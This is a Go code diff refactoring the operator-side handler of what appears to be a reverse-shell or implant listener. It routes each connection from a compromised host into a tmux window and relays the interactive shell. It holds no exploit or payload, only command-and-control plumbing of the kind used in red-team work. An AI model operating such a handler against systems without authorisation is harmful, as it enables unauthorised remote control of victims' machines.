@@ -46,6 +46,14 @@ func init() {
 	// Because of this, all logging is sent to stderr
 	log.SetOutput(os.Stderr)
 	// log.SetLevel(log.DebugLevel)
+
+	// ensure socket folder exists
+	if _, err := os.Stat(".state"); os.IsNotExist(err) {
+		os.Mkdir(".state", 0700)
+	}
+
+	// account for existing session to avoid 'duplicate session' error
+	initSessions()
 }
 
 func main() {
@@ -71,7 +79,7 @@ func main() {
 				continue
 			}
 
-			sockF, err := routeToTmux(conn)
+			sockF, err := prepareTmux(conn)
 			if err != nil {
 				log.Error(err)
 				continue
@@ -121,18 +129,9 @@ func newTLSListener() (net.Listener, error) {
 
 func startShell(conn net.Conn) {
 	log.WithFields(log.Fields{"port": opts.Port, "host": opts.Iface}).Info("Incoming")
-	reader, writer := bufio.NewReader(conn), bufio.NewWriter(conn)
 
 	// continuously read the incoming data and print to stdout
-	go func() {
-		for {
-			out, err := reader.ReadByte()
-			if err != nil {
-				log.Fatalf("error reading from implant: %w\n", err)
-			}
-			fmt.Printf(string(out))
-		}
-	}()
+	go func() { io.Copy(os.Stdout, conn) }()
 
 	teaTeeWhy, err := tty.Open()
 	if err != nil {
@@ -140,13 +139,7 @@ func startShell(conn net.Conn) {
 	}
 	defer teaTeeWhy.Close()
 
-	// support resizing
-	go func() {
-		for ws := range teaTeeWhy.SIGWINCH() {
-			fmt.Println("Resized", ws.W, ws.H)
-		}
-	}()
-
+	// allows catching ctrl+c remotely
 	restore, err := teaTeeWhy.Raw()
 	if err != nil {
 		log.Errorf("failed to enter raw: %s\n", err)
@@ -155,17 +148,7 @@ func startShell(conn net.Conn) {
 	defer restore()
 
 	// read stdin from user and send to remote implant
-	for {
-		key, err := teaTeeWhy.ReadRune()
-		if err != nil {
-			log.Errorf("failed to read input char: %s\n", err)
-			continue
-		}
-
-		writer.WriteRune(key)
-		writer.Flush()
-
-	}
+	io.Copy(conn, teaTeeWhy.Input())
 }
 
 func implantInfo(conn net.Conn) (hostname, username string, err error) {
@@ -188,7 +171,23 @@ func implantInfo(conn net.Conn) (hostname, username string, err error) {
 	return
 }
 
-func routeToTmux(conn net.Conn) (string, error) {
+func genTempFilename(username string) (string, error) {
+	file, err := ioutil.TempFile(".state", fmt.Sprintf("%s.*.sock", username))
+	if err != nil {
+		err = fmt.Errorf("temp file failed: %w", err)
+		return "", err
+	}
+	os.Remove(file.Name())
+
+	path, err := filepath.Abs(file.Name())
+	if err != nil {
+		err = fmt.Errorf("temp path read failed: %w", err)
+		return "", err
+	}
+	return path, nil
+}
+
+func prepareTmux(conn net.Conn) (string, error) {
 
 	hostname, username, err := implantInfo(conn)
 	if err != nil {
@@ -203,28 +202,16 @@ func routeToTmux(conn net.Conn) (string, error) {
 	session := sessions[hostname]
 	window := session.AddWindow(username)
 
-	if _, err := os.Stat(".state"); os.IsNotExist(err) {
-		os.Mkdir(".state", 0700)
-	}
-
-	file, err := ioutil.TempFile(".state", fmt.Sprintf("%s.*.sock", username))
+	path, err := genTempFilename(username)
 	if err != nil {
-		err = fmt.Errorf("temp file failed: %w", err)
-		return "", err
-	}
-	os.Remove(file.Name())
-
-	path, err := filepath.Abs(file.Name())
-	if err != nil {
-		err = fmt.Errorf("temp path read failed: %w", err)
 		return "", err
 	}
 
 	self := os.Args[0]
 	cmd := fmt.Sprintf("%s -s %s", self, path)
-	log.WithFields(log.Fields{"session": session.Name, "window": username}).Info("new shell in tmux")
 	window.Exec(`echo -e '\a'`) // ring a bell
 	window.Exec(cmd)
+	log.WithFields(log.Fields{"session": session.Name, "window": username}).Info("new shell in tmux")
 	return path, nil
 }
 
@@ -261,7 +248,7 @@ func proxyConnToSocket(conn net.Conn, sockF string) {
 
 func initSessions() {
 	for _, name := range sessionList() {
-		sessions[name] = gomux.NewSession(name, os.Stdout)
+		sessions[name] = &gomux.Session{Name: name}
 	}
 }
 
